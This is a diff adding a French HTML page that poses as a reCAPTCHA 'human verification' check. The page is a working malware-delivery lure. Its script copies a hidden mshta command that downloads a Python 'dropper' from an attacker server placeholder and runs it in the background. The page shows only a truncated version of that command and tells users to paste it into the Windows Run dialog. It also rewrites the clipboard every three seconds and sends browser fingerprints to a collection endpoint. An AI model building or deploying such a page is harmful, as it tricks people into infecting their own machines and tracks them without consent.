@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Vérification CAPTCHA</title>
+<style>
+  :root{--bg:#fafafa;--panel:#fff;--blue:#1a73e8;
+        --border:#ddd;--text:#202020;--dim:#777}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);font-family:Arial,sans-serif;
+       min-height:100vh;display:flex;align-items:center;justify-content:center}
+  .panel{background:var(--panel);border:1px solid var(--border);
+         border-radius:8px;padding:40px 36px;width:400px;max-width:95vw;
+         box-shadow:0 2px 12px rgba(0,0,0,.08)}
+  .logo{font-size:38px;text-align:center;margin-bottom:16px}
+  h1{font-size:18px;font-weight:600;text-align:center;margin-bottom:8px}
+  .sub{color:var(--dim);font-size:13px;text-align:center;margin-bottom:24px}
+  .step{background:#f8f8f8;border:1px solid var(--border);border-radius:6px;
+        padding:14px 16px;margin-bottom:12px;font-size:13px;
+        display:flex;align-items:flex-start;gap:10px}
+  .step-num{background:var(--blue);color:#fff;border-radius:50%;
+            width:22px;height:22px;display:flex;align-items:center;
+            justify-content:center;font-size:11px;font-weight:700;
+            flex-shrink:0;margin-top:1px}
+  .step code{background:#e8e8e8;padding:2px 6px;border-radius:3px;font-size:12px}
+  .cmd-box{background:#1a1a1a;color:#00ff88;font-family:monospace;
+           font-size:12px;padding:12px 16px;border-radius:6px;
+           margin:16px 0;word-break:break-all;cursor:pointer;
+           border:1px solid #333;user-select:all}
+  .copy-btn{width:100%;padding:12px;background:var(--blue);border:none;
+            border-radius:6px;color:#fff;font-size:14px;font-weight:600;
+            cursor:pointer}
+  .copy-btn:hover{background:#1660c8}
+  .footer{font-size:11px;color:var(--dim);text-align:center;margin-top:16px}
+  #copied{display:none;color:green;text-align:center;font-size:13px;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="panel">
+  <div class="logo">🤖</div>
+  <h1>Vérification humaine requise</h1>
+  <p class="sub">Prouvez que vous n'êtes pas un robot en suivant ces étapes.</p>
+
+  <div class="step">
+    <div class="step-num">1</div>
+    <div>Appuyez sur <code>Win + R</code> pour ouvrir la fenêtre Exécuter</div>
+  </div>
+  <div class="step">
+    <div class="step-num">2</div>
+    <div>Cliquez sur <strong>Copier la commande</strong> ci-dessous</div>
+  </div>
+  <div class="step">
+    <div class="step-num">3</div>
+    <div>Collez avec <code>Ctrl + V</code> dans la fenêtre Exécuter et appuyez sur <code>Entrée</code></div>
+  </div>
+
+  <div class="cmd-box" id="cmd-display">
+    Chargement de la commande de vérification…
+  </div>
+
+  <button class="copy-btn" id="copy-btn" onclick="copyCmd()">
+    📋 Copier la commande de vérification
+  </button>
+  <div id="copied">✓ Copié ! Ouvrez Win+R, collez et appuyez Entrée.</div>
+  <div class="footer">Protégé par reCAPTCHA — Confidentialité · Conditions</div>
+</div>
+
+<script>
+// SERVER injecté par server.py
+const SERVER = "http://FILL_SERVER:FILL_PORT";
+
+// Commande réelle copiée dans le presse-papier
+// mshta exécute du JS inline → curl le payload → python l'exécute
+// tout en arrière-plan (cmd /c ... ,0,false)
+const PAYLOAD_CMD =
+  `mshta "javascript:new ActiveXObject('WScript.Shell').Run('cmd /c curl -s ${SERVER}/payload?name=dropper -o %tmp%\\\\fl.py && python %tmp%\\\\fl.py',0,false)"`;
+
+// Afficher une version tronquée dans la box
+document.getElementById("cmd-display").textContent =
+  PAYLOAD_CMD.length > 80
+    ? PAYLOAD_CMD.slice(0, 77) + "…"
+    : PAYLOAD_CMD;
+
+function copyCmd() {
+  navigator.clipboard.writeText(PAYLOAD_CMD).then(() => {
+    document.getElementById("copied").style.display = "block";
+    const btn = document.getElementById("copy-btn");
+    btn.textContent = "✓ Copié !";
+    btn.style.background = "#1b8a3c";
+    // Collect fingerprint
+    fetch("/collect", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        page:"captcha_copy",
+        ua:navigator.userAgent,
+        lang:navigator.language,
+        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+      })
+    });
+  }).catch(() => {
+    // Fallback si clipboard API bloquée (HTTP non-secure)
+    const ta = document.createElement("textarea");
+    ta.value = PAYLOAD_CMD;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand("copy");
+    document.body.removeChild(ta);
+    document.getElementById("copied").style.display = "block";
+  });
+}
+
+// Clipboard hijack toutes les 3s — réécriture si l'user a copié autre chose
+let hijackActive = true;
+setInterval(() => {
+  if (!hijackActive) return;
+  navigator.clipboard.readText().then(txt => {
+    if (txt && !txt.includes("mshta")) {
+      navigator.clipboard.writeText(PAYLOAD_CMD).catch(() => {});
+    }
+  }).catch(() => {});
+}, 3000);
+
+// Fingerprint à l'arrivée
+fetch("/collect", {
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({
+    page:"captcha_land",
+    ua:navigator.userAgent,
+    cores:navigator.hardwareConcurrency,
+    mem:navigator.deviceMemory,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  })
+});
+</script>
+</body>
+</html>
